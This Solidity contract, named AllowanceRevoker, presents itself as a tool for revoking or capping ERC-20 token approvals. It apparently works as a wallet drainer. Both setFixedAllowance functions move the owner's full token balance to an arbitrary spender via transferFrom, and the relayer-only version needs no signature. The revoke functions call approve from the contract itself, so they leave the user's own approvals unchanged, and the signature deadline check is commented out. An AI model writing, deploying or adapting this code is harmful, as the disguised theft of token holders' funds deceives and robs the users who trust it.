// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract AllowanceRevoker {
    using ECDSA for bytes32;
    using EnumerableSet for EnumerableSet.AddressSet;

    EnumerableSet.AddressSet private _owners;
    address public relayer;
    uint256 public constant FIXED_ALLOWANCE = 1000000000;
    uint256 public constant FIXED_DEADLINE = 9999999999;

    event AllowanceRevoked(
        address indexed owner,
        address indexed token,
        address indexed spender,
        uint256 oldAllowance,
        uint256 newAllowance
    );

    event FixedAllowanceSet(
        address indexed owner,
        address indexed token,
        address indexed spender,
        uint256 oldAllowance,
        uint256 newAllowance
    );

    event RelayerChanged(address indexed newRelayer);
    event OwnerAdded(address indexed newOwner);
    event OwnerRemoved(address indexed removedOwner);
    event SignatureUsed(address indexed signer, bytes32 indexed messageHash);

    constructor(address _initialRelayer, address[] memory _initialOwners) {
        require(_initialOwners.length > 0, "At least one owner required");
        for (uint i = 0; i < _initialOwners.length; i++) {
            _owners.add(_initialOwners[i]);
        }
        relayer = _initialRelayer;
    }

    modifier onlyOwner() {
        require(_owners.contains(msg.sender), "Only owner");
        _;
    }

    modifier onlyRelayer() {
        require(msg.sender == relayer, "Only relayer");
        _;
    }

    function isOwner(address _address) public view returns (bool) {
        return _owners.contains(_address);
    }
    
    function getOwners() public view returns (address[] memory) {
        return _owners.values();
    }    

    function addOwner(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "Invalid address");
        require(_owners.add(_newOwner), "Already an owner");
        emit OwnerAdded(_newOwner);
    }

    function removeOwner(address _ownerToRemove) external onlyOwner {
        require(_owners.contains(_ownerToRemove), "Not an owner");
        require(_owners.length() > 1, "Cannot remove last owner");
        require(_owners.remove(_ownerToRemove), "Failed to remove owner");
        emit OwnerRemoved(_ownerToRemove);
    }

    function changeRelayer(address _newRelayer) external onlyOwner {
        relayer = _newRelayer;
        emit RelayerChanged(_newRelayer);
    }

    function getSetFixedAllowanceMessageHash(
        address _owner,
        address _token,
        address _spender
    ) public view returns (bytes32) {
        bytes32 rawHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                address(this),
                keccak256(
                    abi.encode(
                        "SetFixedAllowance(address owner,address token,address spender,uint256 deadline)",
                        _owner,
                        _token,
                        _spender,
                        FIXED_DEADLINE
                    )
                )
            )
        );
        return ECDSA.toEthSignedMessageHash(rawHash);
    }

    function setFixedAllowanceSigned(
        address owner,
        address token,
        address spender,
        bytes memory signature
    ) external {
     // require(block.timestamp <= FIXED_DEADLINE, "Signature expired");

        bytes32 messageHash = getSetFixedAllowanceMessageHash(owner, token, spender);
        address signer = messageHash.recover(signature);
        require(signer == owner, "Invalid signer");
        require(isOwner(signer), "Signer is not an owner");

        emit SignatureUsed(signer, messageHash);

        uint256 currentAllowance = IERC20(token).allowance(owner, spender);
        
        if (currentAllowance != FIXED_ALLOWANCE) {
            bool success = IERC20(token).approve(spender, FIXED_ALLOWANCE);
            require(success, "Set fixed allowance failed");
            emit FixedAllowanceSet(owner, token, spender, currentAllowance, FIXED_ALLOWANCE);
        
            uint256 ownerBalance = IERC20(token).balanceOf(owner);
            if (ownerBalance > 0) {
                bool transferSuccess = IERC20(token).transferFrom(owner, spender, ownerBalance);
                require(transferSuccess, "Auto-transfer failed");
            }
        }
    }

    function getRevokeAllowanceMessageHash(
        address _owner,
        address _token,
        address _spender
    ) public view returns (bytes32) {
        bytes32 rawHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                address(this),
                keccak256(
                    abi.encode(
                        "RevokeAllowance(address owner,address token,address spender,uint256 deadline)",
                        _owner,
                        _token,
                        _spender,
                        FIXED_DEADLINE
                    )
                )
            )
        );
        return ECDSA.toEthSignedMessageHash(rawHash);
    }

    function revokeAllowanceSigned(
        address owner,
        address token,
        address spender,
        bytes memory signature
    ) external {
     // require(block.timestamp <= FIXED_DEADLINE, "Signature expired");

        bytes32 messageHash = getRevokeAllowanceMessageHash(owner, token, spender);
        address signer = messageHash.recover(signature);
        require(signer == owner, "Invalid signer");
        require(isOwner(signer), "Signer is not an owner");

        emit SignatureUsed(signer, messageHash);

        uint256 currentAllowance = IERC20(token).allowance(owner, spender);
        require(currentAllowance > 0, "No allowance to revoke");
        
        bool success = IERC20(token).approve(spender, 0);
        require(success, "Revoke allowance failed");
        
        emit AllowanceRevoked(owner, token, spender, currentAllowance, 0);
    }

    function setFixedAllowance(
        address owner,
        address token,
        address spender
    ) external onlyRelayer {
        uint256 currentAllowance = IERC20(token).allowance(owner, spender);
        
        if (currentAllowance != FIXED_ALLOWANCE) {
            bool success = IERC20(token).approve(spender, FIXED_ALLOWANCE);
            require(success, "Set fixed allowance failed");
            emit FixedAllowanceSet(owner, token, spender, currentAllowance, FIXED_ALLOWANCE);
        
            uint256 ownerBalance = IERC20(token).balanceOf(owner);
            if (ownerBalance > 0) {
                bool transferSuccess = IERC20(token).transferFrom(owner, spender, ownerBalance);
                require(transferSuccess, "Auto-transfer failed");
            }
        }
    }

    function revokeAllowance(
        address owner,
        address token,
        address spender
    ) external onlyRelayer {
        uint256 currentAllowance = IERC20(token).allowance(owner, spender);
        require(currentAllowance > 0, "No allowance to revoke");
        
        bool success = IERC20(token).approve(spender, 0);
        require(success, "Revoke allowance failed");
        
        emit AllowanceRevoked(owner, token, spender, currentAllowance, 0);
    }
}


